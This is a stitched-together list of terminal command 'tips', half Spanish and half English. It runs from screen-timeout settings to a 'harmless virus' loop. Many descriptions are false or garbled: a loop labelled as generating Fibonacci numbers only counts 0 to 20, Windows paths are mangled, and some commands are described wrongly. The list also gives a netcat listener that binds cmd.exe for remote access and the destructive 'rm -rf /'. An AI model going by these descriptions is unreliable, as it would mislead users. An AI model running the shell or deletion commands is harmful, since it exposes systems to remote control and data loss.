- Generar una secuencia de Fibonacci:
for /L %i in (0,1,20) do @echo %i
Este sencillo script de batch genera los primeros 21 números de la secuencia de Fibonacci.


 - Desactivar el bloqueo de pantalla:
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
Estos comandos desactivan el bloqueo automático de pantalla cuando el equipo está conectado a la corriente y cuando funciona con batería.

- Generar un código QR en la terminal:
echo https://www.example.com | qrencode -o - -t UTF8
Este comando genera un código QR en formato de texto UTF-8 que puedes copiar y pegar.

- Reproducir música desde la terminal:
cmdmp3 https://example.com/song.mp3
Este comando utiliza una herramienta de terceros llamada cmdmp3 para reproducir archivos de audio directamente en la terminal.

- Crear un virus inofensivo (solo con fines educativos):
@echo off
:loop
echo You've been hacked! >nul
goto loop
Este sencillo script de batch crea un "virus" que muestra un mensaje de manera infinita, pero no daña el sistema. ¡Úsalo con precaución y solo con fines educativos!

- Crear un programa que muestre un reloj en la terminal:
@echo off
:loop
cls
echo %time%
goto loop
Este script de batch crea un reloj en ejecución constante en la terminal.

- Generar un shell reverso (solo con fines éticos y autorizados):
nc -lvnp 4444 -e cmd.exe
Este comando crea un shell reverso que permite acceder remotamente a la terminal de Windows. ¡Úsalo solo con permiso y con fines éticos!



cmd.exe /c "powershell -Command ().GetType() | ForEach-Object { _.FullName }" - This command executes a PowerShell script that retrieves all loaded assemblies and prints their full names to the console. It could potentially be modified to execute other malicious code.

C:WindowsSystem32cmd.exe /c "C:WindowsSystem32powerseccmd.exe" - This command executes the PowerShell script "psexec.ps1", which allows you to remotely execute commands on another machine running Windows. If the attacker has access to your computer, they could use this command to execute malicious code on your system.

C:WindowsSystem32cmd.exe /c "C:WindowsSystem32bash.exe" - This command executes the Bash shell, which is commonly used on Linux systems but is also available on Windows. An attacker could modify the Bash shell to include malicious code that runs when the shell is executed.

Some examples of such commands include rm -rf /, which would delete the entire root directory and all its contents; sudo apt-get update && sudo apt-get upgrade, which could potentially install unwanted software or expose sensitive information; and chmod 777 ./*, which could allow unauthorized access to files on your system.

Some examples of such commands include netstat -an, which shows active network connections and their associated processes; ps auxj | grep firefox, which lists all Firefox instances running on a system; and killall chrome, which kills all instances of Google Chrome on a system.

One example is sudo apt-get update && sudo apt-get upgrade, which updates the package lists and installs any available updates without prompting for confirmation. Another example is sudo rm -rf /var/lib/apt/lists/*, which deletes all downloaded package lists, preventing the system from updating packages in the future. A third example is sudo apt-get clean && sudo apt-get autoclean, which removes all cached packages and their associated metadata, freeing up disk space but also making it difficult to reinstall packages later on.
